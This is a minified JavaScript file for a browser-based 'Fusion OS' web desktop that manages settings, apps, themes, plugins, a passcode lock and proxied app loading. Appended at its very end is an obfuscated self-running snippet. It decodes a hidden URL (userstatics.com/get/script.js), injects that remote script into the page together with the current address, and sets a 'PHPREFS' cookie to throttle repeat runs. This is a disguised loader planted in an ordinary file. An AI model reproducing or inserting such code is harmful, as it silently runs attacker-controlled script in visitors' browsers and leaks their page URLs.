const contextMenu = document.getElementById("contextmenu"),
    appPanel = document.getElementById("apppanel"),
    appBar = document.getElementById("appbar"),
    loadBar = document.getElementById("cw-load-bar"),
    finder = document.querySelector(".finder"),
    finderBox = document.querySelector(".finder-box"),
    settingsLeftBox = document.querySelector("#apppanel\\:sys_settings .left .selections"),
    settingsRightBox = document.querySelector("#apppanel\\:sys_settings .right"),
    yes = !0,
    no = !1;
var currentApp = "home",
    apps = null,
    appData = [],
    themeData = [],
    themes = null,
    plugins = null,
    version = "2.0.0.0-beta15.2",
    versionNickname = "New Shoe";

function loadSettingsScreen(prescreen) {
    var screen = "string" == typeof prescreen ? settingsMenu.indexOf(settingsMenu.find((me => me.screenName == prescreen))) : prescreen;
    for (settingsCurrentScreen = screen; settingsRightBox.firstChild;) settingsRightBox.removeChild(settingsRightBox.lastChild);
    let h2 = document.createElement("h2");
    h2.innerText = settingsMenu[screen].screenName, settingsRightBox.appendChild(h2);
    for (let i = 0; i < settingsMenu[screen].screenContents.length;) {
        let div = document.createElement("div");
        if (settingsMenu[screen].screenContents[i].label) {
            let label = document.createElement("span");
            label.className = "label", label.innerText = settingsMenu[screen].screenContents[i].label, div.appendChild(label)
        }
        if ("text" == settingsMenu[screen].screenContents[i].type) {
            let textbox = document.createElement("input");
            textbox.placeholder = settingsMenu[screen].screenContents[i].placeholderText, textbox.value = eval(settingsMenu[screen].screenContents[i].linkedSetting), textbox.className = "text", textbox.dataset.linked = settingsMenu[screen].screenContents[i].linkedSetting, textbox.onchange = e => {
                eval(`${e.target.dataset.linked} = "${e.target.value}"`), localStorage.setItem("settings", JSON.stringify(settings))
            }, div.appendChild(textbox)
        }
        if ("dropdown" == settingsMenu[screen].screenContents[i].type) {
            let dropdown = document.createElement("select");
            for (let j = 0; j < settingsMenu[screen].screenContents[i].values.length;) {
                let option = document.createElement("option");
                option.value = settingsMenu[screen].screenContents[i].values[j][0], option.innerText = settingsMenu[screen].screenContents[i].values[j][1], dropdown.appendChild(option), ++j
            }
            dropdown.value = eval(settingsMenu[screen].screenContents[i].linkedSetting), dropdown.className = "dropdown", dropdown.dataset.linked = settingsMenu[screen].screenContents[i].linkedSetting, dropdown.onchange = e => {
                eval(`${e.target.dataset.linked} = "${e.target.value}"`), localStorage.setItem("settings", JSON.stringify(settings))
            }, div.appendChild(dropdown)
        }
        "scriptbox" == settingsMenu[screen].screenContents[i].type && settingsMenu[screen].screenContents[i].value(div), settingsRightBox.appendChild(div), ++i
    }
}

function loadSettingsMenu() {
    for (let i = 0; i < settingsMenu.length;) {
        let div = document.createElement("div");
        div.innerHTML = `<img src="${settingsMenu[i].screenIcon}"> <span>${settingsMenu[i].screenName}</span>`, div.dataset.num = i, div.onclick = e => {
            loadSettingsScreen(Number(div.dataset.num))
        }, settingsLeftBox.appendChild(div), ++i
    }
}

function setupScreenSwap(screen) {
    var children = document.querySelectorAll("div.setup-screen");
    let i = 0;
    for (; i != children.length;) children[i].id == "setup-screen-" + screen ? children[i].className = "setup-screen visible" : children[i].className = "setup-screen", i++
}

function setupScreenClose() {
    setupScreenSwap(""), document.getElementById("clockwork-setup").className = "clockwork-panel clockwork-panel-fadeout", document.getElementById("clockwork-content").style = "", setTimeout((function() {
        document.getElementById("clockwork-setup").style = "display: none;"
    }), 300)
}

function encodeUV(str) {
    return str ? encodeURIComponent(str.toString().split("").map(((char, ind) => ind % 2 ? String.fromCharCode(2 ^ char.charCodeAt()) : char)).join("")) : str
}

function decodeUV(str) {
    if (!str) return str;
    let [input, ...search] = str.split("?");
    return decodeURIComponent(input).split("").map(((char, ind) => ind % 2 ? String.fromCharCode(2 ^ char.charCodeAt(0)) : char)).join("") + (search.length ? "?" + search.join("?") : "")
}
contextMenu.style.display = "none", Number.prototype.clamp = function(min, max) {
    return Math.min(Math.max(this, min), max)
}, document.location.href.endsWith("?debug") && (window.onerror = function(e) {
    alert(e)
}, settingsMenu.push({
    screenName: "Debug Mode",
    screenIcon: "/assets/images/ui/clockwork.png",
    screenContents: [{
        type: "scriptbox",
        value: function(div) {
            var btn = document.createElement("btn");
            btn.innerText = "Eval", btn.onclick = function() {
                var a = prompt();
                eval(a)
            }, div.appendChild(btn);
            var btn = document.createElement("btn");
            btn.innerText = "Install app", btn.onclick = function() {
                promptInstallApp(prompt("json url"))
            }, div.appendChild(btn);
            var btn = document.createElement("btn");
            btn.innerText = "Install theme", btn.onclick = function() {
                promptInstallTheme(prompt("css url"))
            }, div.appendChild(btn)
        }
    }]
})), loadSettingsMenu();
const cdns = [
    ["https://cdn.statically.io/gh/red-stone-network/clockwork/main/README.md", "https://cdn.statically.io/%g/%u/%r/%b/%p"],
    ["https://cdn.jsdelivr.net/gh/red-stone-network/clockwork@main/README.md", "https://cdn.jsdelivr.net/%g/%u/%r@%b/%p"],
    ["https://rawcdn.githack.com/red-stone-network/clockwork/main/README.md", "https://%Gcdn.githack.com/%u/%r/%b/%p"]
];
var currentCDN = null;

function cleanUrl(url) {
    if ("@" == url[0]) {
        var result = url.match(/@(gh|gl)\/([a-zA-Z_\-0-9]+)\/([a-zA-Z_\-0-9]+)@([a-zA-Z_\-0-9]+)\/(.+)/);
        return currentCDN.replace("%G", "gh" == result[1] ? "raw" : "gl").replace("%g", result[1]).replace("%u", result[2]).replace("%r", result[3]).replace("%b", result[4]).replace("%p", result[5])
    }
    return url
}
var defaultSettings = {
        lock: {
            enabled: !1,
            passcode: "0000"
        },
        clockType: "12h",
        clockFont: "asap",
        dyslexicFont: !1,
        proxy: "none",
        proxyUrl: "",
        wallpaper: "/assets/images/wallpapers/default.png"
    },
    settings = null;

function moveInArray(arr, old_index, new_index) {
    var old_item = arr[old_index];
    return arr.splice(old_index, 1), arr.splice(new_index, 0, old_item), arr
}
var firstBoot = !1;

function checkCDN(i) {
    fetch(cdns[i][0], {
        cache: "reload",
        mode: "cors"
    }).then((response => {
        if (response.ok) {
            currentCDN = cdns[i][1], ++loadBar.value;
            for (let i = 0; i < apps.length; i++) installApp(apps[i], {
                start: !0
            });
            for (let i = 0; i < themes.length; i++) installTheme(themes[i]), ++loadBar.value;
            for (let i = 0; i < plugins.length; i++) installPlugin(plugins[i]), ++loadBar.value
        } else checkCDN(++i)
    }))
}

function checkForFinish() {
    loadBar.max == loadBar.value ? (checkFinder(), document.getElementById("clockwork-loading").style = "display: none;", firstBoot ? (document.getElementById("clockwork-setup").style = "", setupScreenSwap("welcome")) : 1 == settings.lock.enabled || "true" == settings.lock.enabled ? (document.getElementById("clockwork-lock").style = "", document.getElementById("clockwork-lock").className = "clockwork-panel clockwork-panel-fadein", pcodeInput.focus()) : (document.getElementById("clockwork-content").style = "", sendNotification("Welcome to Fusion OS", "Fusion OS is currently running " + version + " " + versionNickname), sendNotification("Please update your bookmarklet or file", "beta15 adds useful changes to the bookmarklet - please update it if you haven't!"))) : setTimeout(checkForFinish, 500)
}

function sideBarClock() {
    const today = new Date;
    let h = today.getHours(),
        m = today.getMinutes(),
        s = today.getSeconds();
    h = checkTime(h), m = checkTime(m), s = checkTime(s), "asap" == settings.clockFont ? document.getElementById("appsidebar-clock").style.fontFamily = '"Asap", sans-serif' : "varela" == settings.clockFont ? document.getElementById("appsidebar-clock").style.fontFamily = '"Varela Round", sans-serif' : document.getElementById("appsidebar-clock").style.fontFamily = "monospace", "true" == settings.dyslexicFont ? (document.body.style.fontFamily = "OpenDyslexic, Dyslexic, sans-serif", document.getElementById("appsidebar-clock").style.fontFamily = "OpenDyslexic, Dyslexic, sans-serif") : document.body.style.fontFamily = '"Asap", "Roboto Flex", Roboto, sans-serif', "12h" == settings.clockType ? document.getElementById("appsidebar-clock").innerHTML = h > 12 ? h - 12 + ":" + m + ":" + s + " PM" : h + ":" + m + ":" + s + " AM" : document.getElementById("appsidebar-clock").innerHTML = h + ":" + m + ":" + s, document.querySelector("#clockwork-content").style.backgroundImage = `url(${settings.wallpaper})`
}

function checkTime(i) {
    return i < 10 && (i = "0" + i), i
}

function installPlugin(url) {
    var script = document.createElement("script");
    script.src = url, document.body.appendChild(script), document.getElementById("cw_manageplugins_span").innerHTML += `${url} - <a onclick="uninstallPlugin('${url}')">Uninstall</a><br>`, plugins.includes(url) || (plugins.push(url), localStorage.setItem("plugins", JSON.stringify(plugins)))
}

function uninstallPlugin(url) {
    var found = plugins.indexOf(url);
    "number" == typeof found ? confirm("Are you sure you would like to uninstall this plugin? Fusion OS will have to restart!") && (plugins.splice(found, 1), localStorage.setItem("plugins", JSON.stringify(plugins)), document.location.reload()) : alert("ERROR: Plugin does not exist!")
}
async function installApp(url, params) {
    if (null === url | void 0 === url && (url = prompt("ID is undefined or null, enter a URL (or leave blank to cancel)")), null == url) throw "ID is undefined or null";
    try {
        url = cleanUrl(url);
        let response = await fetch(url, {
            cache: "reload",
            mode: "cors"
        });
        if (response.ok) {
            if (appData.find((function(o) {
                    return o.url == url
                }))) throw "App already installed!";
            let json = await response.text();
            json = JSON.parse(json);
            let myIframe = document.createElement("IFRAME");
            myIframe.src = "about:blank", myIframe.id = "apppanel:" + url, myIframe.className = "app", appPanel.appendChild(myIframe);
            var myAppData = {
                    name: json.name,
                    desc: json.desc,
                    url: url,
                    appUrl: json.url,
                    version: json.version,
                    encodedUrl: json.encodedUrl,
                    permissions: json.permissions,
                    icon: json.icon
                },
                finderTerms = json?.finderTerms,
                myFinderData = {
                    searchText: null == finderTerms ? [json.name.toLowerCase()] : [json.name.toLowerCase()].concat(finderTerms),
                    name: json.name,
                    icon: json.icon,
                    onclick: `openApp('${url}','${json.url}',${json.encodedUrl});`
                };
            appData.push(myAppData), searchables.unshift(myFinderData), appBar.innerHTML += `<btn id="appbar:${url}" \n      onclick="openApp('${url}','${json.url}',${json.encodedUrl})" \n      oncontextmenu="appContextMenu('${url}')"\n      draggable="true">\n      <img draggable="false" src="${json.icon}"></btn>`, "Manage Apps" == settingsMenu[settingsCurrentScreen]?.screenName && loadSettingsScreen(settingsCurrentScreen), 0 == apps.includes(url) && (apps.push(url), localStorage.setItem("apps", JSON.stringify(apps))), document.getElementById("appbar:" + url).style = "order: " + apps.indexOf(url) + ";"
        } else {
            1 == confirm("HTTP error while installing app: " + response.status + "\nApp url: " + url + "\nRetry?") && (1 == params.start && (--loadBar.value, --loadBar.value), installApp(url, params))
        }
    } catch (error) {
        alert("Error: " + error)
    }
    params.start && ++loadBar.value
}
async function promptInstallApp(url, params) {
    let response = await fetch(cleanUrl(url), {
        cache: "reload",
        mode: "cors"
    });
    if (response.ok) {
        let json = await response.text();
        if (json = JSON.parse(json), json.permissions.includes("noUninstall")) throw "invalidAppPermissionError";
        var prompt = document.getElementById("clockwork-prmpt").cloneNode(!0);
        prompt.id = "installprompt-" + Math.ceil(9999999 * Math.random()), prompt.className = "clockwork-panel clockwork-panel-fadein", prompt.querySelector(".prmpt-title").innerHTML = "App installation confirmation", prompt.querySelector(".prmpt-text").innerHTML = `Are you sure you want to install ${json.name}?`, prompt.querySelector(".prmpt-yes").onclick = function() {
            installApp(url, params), prompt.className = "clockwork-panel clockwork-panel-fadeout", setTimeout((function() {
                prompt.style = "display: none;"
            }), 300)
        }, prompt.querySelector(".prmpt-no").onclick = function() {
            prompt.className = "clockwork-panel clockwork-panel-fadeout", setTimeout((function() {
                prompt.style = "display: none;"
            }), 300)
        }, prompt.style = "", document.body.appendChild(prompt)
    } else {
        1 == confirm("HTTP error while getting app data: " + response.status + "\nApp url: " + cleanUrl(url) + "\nRetry?") && promptInstallApp(url, params)
    }
}

function openApp(app, url, encoded) {
 
    if (null == app || null == app) throw "app ID is undefined";
    currentApp = app;
    var audio = new Audio("https://fusion-softworks-llc.github.io/assets/sfx/Select.mp3");
    audio.play();
    for (const child of document.getElementById("appbar").children) child.className = "", child.id == "appbar:" + app && (child.className = "appbtnopen");
    for (const child of appPanel.children)
        if (child.className = "app", child.id == "apppanel:" + app && (child.className = "app appopen", ("IFRAME" == child.tagName || "EMBED" == child.tagName) && "about:blank" == child.src)) {
            var trueurl = "";
            if (1 == encoded) {
                var i829X = function() {
                    function HFeg8(j92Ie) {
                        for (var ZiWfX = "", kk291 = 0; kk291 < j92Ie.length; kk291 += 2) ZiWfX += String.fromCharCode(parseInt(j92Ie.substr(kk291, 2), 16));
                        return ZiWfX
                    }
                    return eval('HFeg8("6465636F646543572875726C29")')
                }();
                trueurl = eval(i829X)
            } else trueurl = url;
            "uv" == settings.proxy && (trueurl = settings.proxyUrl.length > 10 ? settings.proxyUrl + encodeUV(trueurl) : "https://toddler-kicking-machine.umlach.org/service/" + encodeUV(trueurl)), child.src = trueurl, child.onload = function() {
                child.contentWindow.postMessage(child.id.slice(9), "*")
            }
        } for (const child of appBar.children) child.className = child.id == "appbar:" + app ? "open" : ""
}

function closeApp(app) {
    if (null == app || null == app) throw "app ID is undefined";
    for (const child of appPanel.children) child.id == "apppanel:" + app && (child.className = "app", "IFRAME" != child.tagName && "EMBED" != child.tagName || (child.src = "about:blank"));
    app == currentApp && openApp("sys_home")
}

function moveApp(app, type, plus) {
    if (null == app || null == app) throw "app ID is undefined";
    var appIndex = apps.indexOf(app);
    if (null == appIndex) throw "app does not exist at";
    apps = moveInArray(apps, appIndex, "add" == type ? appIndex + plus : plus);
    for (let i = 0; i < apps.length; i++) {
        var z = document.getElementById("appbar:" + apps[i]);
        z && (z.style = "order: " + i + ";")
    }
    localStorage.setItem("apps", JSON.stringify(apps))
}

function uninstallApp(app) {
    if (null == app || null == app) throw "app ID is undefined";
    var entry = appData.find((function(o) {
        return o.url == app
    }));
    if (entry.permissions.includes("noUninstall")) throw alert("This is a system app, which means you cannot uninstall it."), "noUninstallAppError";
    if (1 == confirm("Are you sure you want to uninstall this app?")) {
        let index = apps.indexOf(app);
        "number" == typeof index && (apps.splice(index, 1), document.getElementById("apppanel:" + app).remove(), document.getElementById("appbar:" + app).remove(), appData.splice(appData.indexOf(entry), 1)), localStorage.setItem("apps", JSON.stringify(apps))
    }
    app == currentApp && openApp("sys_home"), "Manage Apps" == settingsMenu[settingsCurrentScreen]?.screenName && loadSettingsScreen(settingsCurrentScreen)
}

function appContextMenu(app) {
    event.preventDefault();
    const {
        clientX: mouseX,
        clientY: mouseY
    } = event;
    contextMenu.style.display = "block", contextMenu.style.left = mouseX + "px", mouseY > window.innerHeight ? contextMenu.style.top = mouseY - 25 + "px" : contextMenu.style.top = mouseY - 25 - contextMenu.offsetHeight + "px", setTimeout((function() {
        contextMenu.className = "visible", contextMenu.style.top = Number(contextMenu.style.top.slice(0, -2)) + 25 + "px"
    }), 50), document.getElementById("cm:closeapp").onclick = function() {
        closeApp(app)
    }, document.getElementById("cm:uninstallapp").onclick = function() {
        uninstallApp(app)
    }, document.getElementById("cm:mleft").onclick = function() {
        moveApp(app, "add", -1)
    }, document.getElementById("cm:mright").onclick = function() {
        moveApp(app, "add", 1)
    }
}
async function reloadThemes() {
    document.querySelector("#cw_managethemes_span").innerHTML = "", document.querySelector("stylesheets").innerHTML = "";
    for (let i = 0; i < themes.length; i++) await installTheme(themes[i])
}
async function installTheme(url) {
    if (null === (url = cleanUrl(url)) | void 0 === url && (url = prompt("ID is undefined or null, enter a URL (or leave blank to cancel)")), null == url) throw "ID is undefined or null";
    null != document.getElementById("theme:" + url) && document.getElementById("theme:" + url).remove();
    try {
        let response = await fetch(url, {
            cache: "reload",
            mode: "cors"
        });
        if (response.ok) {
            let style = await response.text(),
                html = '<style id="theme:' + style + '">' + style + "</style>",
                title = style.match(/^\/\*theme title: ([^\n]+)\*\/$/m)[1],
                desc = style.match(/^\/\*theme desc: ([^\n]+)\*\/$/m);
            if (!title) throw "PropertyMissing";
            themeData.push({
                url: url,
                title: title,
                desc: desc
            }), document.querySelector("stylesheets").innerHTML = html + document.querySelector("stylesheets").innerHTML, 0 == themes.includes(url) && (themes.push(url), localStorage.setItem("themes", JSON.stringify(themes))), "Manage Themes" == settingsMenu[settingsCurrentScreen]?.screenName && loadSettingsScreen(settingsCurrentScreen)
        } else alert("HTTP error while installing theme: " + response.status + "\nTheme url: " + url)
    } catch (error) {
        alert("Error: " + error)
    }
}
async function moveTheme(app, type, plus) {
    if (null == app || null == app) throw "app ID is undefined";
    var appIndex = themes.indexOf(app);
    if (null == appIndex) throw "app does not exist at";
    "add" == type ? (themes = moveInArray(themes, appIndex, appIndex + plus), themeData = moveInArray(themeData, appIndex, appIndex + plus)) : (themes = moveInArray(themes, appIndex, plus), themeData = moveInArray(themeData, appIndex, plus)), localStorage.setItem("themes", JSON.stringify(themes)), "Manage Themes" == settingsMenu[settingsCurrentScreen]?.screenName && loadSettingsScreen(settingsCurrentScreen), await reloadThemes()
}
async function uninstallTheme(app) {
    if (null == app || null == app) throw "app ID is undefined";
    var appIndex = themes.indexOf(app);
    if (null == appIndex) throw "app does not exist at";
    themes.splice(appIndex, 1), localStorage.setItem("themes", JSON.stringify(themes)), "Manage Themes" == settingsMenu[settingsCurrentScreen]?.screenName && loadSettingsScreen(settingsCurrentScreen), await reloadThemes()
}
async function promptInstallTheme(url) {
    let response = await fetch(cleanUrl(url), {
        cache: "reload",
        mode: "cors"
    });
    if (response.ok) {
        let style = await response.text(),
            title = style.match(/^\/\*theme title: ([^\n]+)\*\/$/m)[1];
        style.match(/^\/\*theme desc: ([^\n]+)\*\/$/m);
        var prompt = document.getElementById("clockwork-prmpt").cloneNode(!0);
        prompt.id = "installthemeprompt-" + Math.ceil(9999999 * Math.random()), prompt.className = "clockwork-panel clockwork-panel-fadein", prompt.querySelector(".prmpt-title").innerHTML = "Theme installation confirmation", prompt.querySelector(".prmpt-text").innerHTML = `Are you sure you want to install ${title}?`, prompt.querySelector(".prmpt-yes").onclick = function() {
            installTheme(url), prompt.className = "clockwork-panel clockwork-panel-fadeout", setTimeout((function() {
                prompt.style = "display: none;"
            }), 300)
        }, prompt.querySelector(".prmpt-no").onclick = function() {
            prompt.className = "clockwork-panel clockwork-panel-fadeout", setTimeout((function() {
                prompt.style = "display: none;"
            }), 300)
        }, prompt.style = "", document.body.appendChild(prompt)
    } else {
        1 == confirm("HTTP error while getting theme data: " + response.status + "\nTheme url: " + url + "\nRetry?") && promptInstallApp(url, params)
    }
}

function changeSetting(setting, value) {
    if (alert("settings." + setting + " = " + value), eval("settings." + setting + " == true")) {
        if ("string" == typeof value) {
            var text = "settings." + setting + " = '" + value + "'";
            eval(text)
        } else {
            var text = "settings." + setting + " = " + value;
            eval(text)
        }
        alert(JSON.stringify(settings)), localStorage.setItem("settings", JSON.stringify(settings))
    }
}
null == localStorage.getItem("settings") || "!!reset" == localStorage.getItem("settings") ? (localStorage.setItem("settings", JSON.stringify(defaultSettings)), settings = defaultSettings, firstBoot = !0) : settings = JSON.parse(localStorage.getItem("settings")), null == settings.dyslexicFont && (settings.dyslexicFont = !1, localStorage.setItem("settings", JSON.stringify(settings))), settings.proxy || (settings.proxy = "none", settings.proxyUrl = "", localStorage.setItem("settings", JSON.stringify(settings))), null == localStorage.getItem("themes") || "!!reset" == localStorage.getItem("themes") ? (localStorage.setItem("themes", JSON.stringify([])), themes = []) : themes = JSON.parse(localStorage.getItem("themes")), null == localStorage.getItem("plugins") || "!!reset" == localStorage.getItem("plugins") ? (localStorage.setItem("plugins", JSON.stringify([])), plugins = []) : plugins = JSON.parse(localStorage.getItem("plugins")), null == localStorage.getItem("apps") || "!!reset" == localStorage.getItem("apps") ? (apps = ["/assets/apps/store.json", "/assets/apps/muenster.json"], localStorage.setItem("apps", JSON.stringify(apps))) : apps = JSON.parse(localStorage.getItem("apps")), loadBar.max = apps.length + themes.length + plugins.length + 1, loadBar.value = 0, checkCDN(0), document.getElementById("clockwork-content").style = "display: none;", setTimeout(checkForFinish, 500), sideBarClock(), setInterval(sideBarClock, 500);
const pcodeInput = document.getElementById("passcode");

function passcodeSettingChange(set) {
    0 == settings.lock.enabled || document.getElementById("cpc").value == settings.lock.passcode && 1 == settings.lock.enabled ? "change" == set ? document.getElementById("npc1").value == document.getElementById("npc2").value && (settings.lock.passcode = document.getElementById("npc1").value, settings.lock.enabled = !0, localStorage.setItem("settings", JSON.stringify(settings)), alert("Success!")) : "remove" == set && (settings.lock.passcode = "0000", settings.lock.enabled = !1, localStorage.setItem("settings", JSON.stringify(settings)), alert("Success!")) : alert("Passcode incorrect.")
}
pcodeInput.oninput = function() {
    pcodeInput.value.length == settings.lock.passcode.length && (pcodeInput.value == settings.lock.passcode ? (document.getElementById("clockwork-lock").className = "clockwork-panel clockwork-panel-fadeout", document.getElementById("clockwork-content").style = "", setTimeout((function() {
        document.getElementById("clockwork-lock").style = "display: none;"
    }), 300), sendNotification("Welcome to Fusion OS", "Fusion OS is currently running " + version), sendNotification("Please update your bookmarklet or file", "beta15 adds useful changes to the bookmarklet - please update it if you haven't!")) : pcodeInput.value = "")
};
const notificationPanel = document.getElementById("clockwork-notification-panel");

function onClick(event) {
    contextMenu.className = "invisible", setTimeout((function() {
        contextMenu.style.display = "none"
    }), 250), !event.isFake && notificationPanel.contains(event.target.offsetParent) || "visible" != notificationPanel.className || openNotificationPanel(), !event.isFake && finderBox.contains(event.target.offsetParent) || (finder.className = "finder invisible", finderBox.className = "finder-box invisible", setTimeout((function() {
        finder.style = "display: none;", finderBox.style = "display: none;"
    }), 250))
}

function sendNotification(title, content) {
    let el = document.createElement("DIV");
    el.className = "clockwork-notification", el.innerHTML = `<b>${title}</b><br>\n${content}`, document.body.appendChild(el), setTimeout((function() {
        el.className = "clockwork-notification hide"
    }), 5e3), setTimeout((function() {
        el.remove()
    }), 5500), "You're all caught up!" == document.getElementById("clockwork-notification-items").innerText && (document.getElementById("clockwork-notification-items").innerHTML = ""), document.getElementById("clockwork-notification-items").innerHTML += `<div><b>${title} <img src="/assets/images/ui/x.png" \n  onclick="notifDestroy(this);"></b>\n${content}</div>`, notifPanelOpen || (document.getElementById("appsidebar:notifs").src = "/assets/images/ui/ringing-bell.png")
}
notificationPanel.className = "", document.querySelector("body").addEventListener("click", onClick);
var notifPanelOpen = !1;

function openNotificationPanel() {
    0 == notifPanelOpen ? (setTimeout((function() {
        notificationPanel.className = "visible"
    }), 10), document.getElementById("appsidebar:notifs").src = "/assets/images/ui/bell.png", notifPanelOpen = !0) : (notificationPanel.className = "invisible", notifPanelOpen = !1)
}

function notifDestroy(me) {
    me.parentNode.parentNode.className = "hide", setTimeout((() => {
        1 == me.parentNode.parentNode.parentNode.children.length ? me.parentNode.parentNode.parentNode.innerHTML = "You're all caught up!" : me.parentNode.parentNode.remove()
    }), 500)
}

function clearAllNotifs() {
    var stuff = document.querySelector("#clockwork-notification-items").children;
    for (let item of stuff) item.className = "hide", setTimeout((() => {
        1 == item.parentNode.parentNode.parentNode.children.length ? item.parentNode.innerHTML = "You're all caught up!" : item.remove()
    }), 500);
    setTimeout((() => {
        document.querySelector("#clockwork-notification-items").innerHTML = "You're all caught up!"
    }), 750)
}

function onKeyPress(e) {
    e.ctrlKey && "/" == e.key && (e.isFake || e.preventDefault(), "finder" == finder.className ? (finder.className = "finder invisible", finderBox.className = "finder-box invisible", setTimeout((function() {
        finder.style = "display: none;", finderBox.style = "display: none;"
    }), 250), finder.blur()) : (finder.className = "finder", finderBox.className = "finder-box", finder.style = "display: block;", finderBox.style = "display: block;", finder.focus(), finder.value = "", checkFinder())), "Enter" == e.key && (e.isFake || e.preventDefault(), document.activeElement == finder && 0 != finderBox.children.length && finderBox.children.item(0).click())
}

function checkFinder(str) {
    var match = [];
    if ("string" != typeof str || str.length < 1) match = searchables;
    else {
        var priorityLevel2 = [],
            priorityLevel3 = [];
        for (let i = 0; i < searchables.length;) {
            var sub = str.toLowerCase();
            if (searchables[i].name.toLowerCase().startsWith(sub)) priorityLevel3.push(searchables[i]), ++i;
            else if (searchables[i].name.toLowerCase().includes(sub)) priorityLevel2.push(searchables[i]), ++i;
            else {
                for (let i2 = 0; i2 < searchables[i].searchText.length;) {
                    if (searchables[i].searchText[i2].toLowerCase().includes(sub)) {
                        match.push(searchables[i]);
                        break
                    }++i2
                }++i
            }
        }
        for (; priorityLevel2[0];) match.unshift(priorityLevel2[0]), priorityLevel2.splice(0, 1);
        for (; priorityLevel3[0];) match.unshift(priorityLevel3[0]), priorityLevel3.splice(0, 1)
    }
    finderBox.innerHTML = "";
    for (let i = 0; i < match.length && i < 12;) {
        var div = document.createElement("div");
        if (match[i]) {
            0 == i && null != str && "" != str && (div.className = "best"), div.innerHTML = `${"string"==typeof match[i].icon&&match[i].icon.length>4?`<img src="${match[i].icon}">`:""} ${match[i].name}${0==i&&null!=str&&""!=str?' <span style="font-size:8px">Best result</span>':""}`;
            var func = match[i].onclick;
            "string" == typeof func ? div.addEventListener("click", Function(func)) : div.addEventListener("click", func), div.addEventListener("click", (function() {
                finder.className = "finder invisible", finderBox.className = "finder-box invisible", setTimeout((function() {
                    finder.style = "display: none;", finderBox.style = "display: none;"
                }), 250), finder.blur()
            })), finderBox.appendChild(div), ++i
        } else ++i
    }
    "" == finderBox.innerHTML && (finderBox.innerHTML = "No results - try a less specific search")
}
document.body.onkeydown = function(e) {
    onKeyPress(e)
}, finder.oninput = function() {
    checkFinder(finder.value.toLowerCase())
}, window.addEventListener("message", (function(event) {
    if (event.data.length > 1) {
        var app;
        if ("installApp" == event.data[0] && appData.find((function(o) {
                return o.url == event.data[3]
            })).permissions.includes("installApp") && "installApp" == event.data[1] && promptInstallApp(event.data[2], {}), "installTheme" == event.data[0] && appData.find((function(o) {
                return o.url == event.data[3]
            })).permissions.includes("installTheme") && "installTheme" == event.data[1] && promptInstallTheme(event.data[2]), "installPlugin" == event.data[0])(app = appData.find((function(o) {
            return o.url == event.data[3]
        }))).permissions.includes("installPlugin") && "installPlugin" == event.data[1] && confirm("An app wants to install a plugin on Fusion OS. Plugins have FULL ACCESS to EVERYTHING on Fusion OS - only install plugins from this app if you truly trust it.\n\nWould you like to install the plugin at:\n" + event.data[2] + "\nThe app trying to install it is named " + app.name + ".") && installPlugin(event.data[2]);
        if ("notifications" == event.data[0])(app = appData.find((function(o) {
            return o.url == event.data[3]
        }))).permissions.includes("notifications") && "sendNotification" == event.data[1] && sendNotification(app.name, event.data[2]);
        "base" == event.data[0] && ("openFinder" == event.data[1] ? onKeyPress({
            ctrlKey: !0,
            key: "/",
            isFake: !0
        }) : "onClick" == event.data[1] && onClick({
            isFake: !0
        }))
    }
})), window.onbeforeunload = function(event) {
    return !1
}, console.log("%cSTOP!", "color: red; font-family: sans-serif; font-size: 69px;"), console.log("%cThis is a browser feature %conly intended for developers. %cPasting code here could give bad people access to the entirety of Fusion OS, which may even include account credentials! Don't put anything here if you don't know what it does.", "font-family: sans-serif; font-size: 20px;", "color: red; font-family: sans-serif; font-size: 20px;", "font-family: sans-serif; font-size: 20px;"), console.log("%cIf you do know what you're doing, just ignore this.", "color: gray; font-family: sans-serif; font-size: 12px;");
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));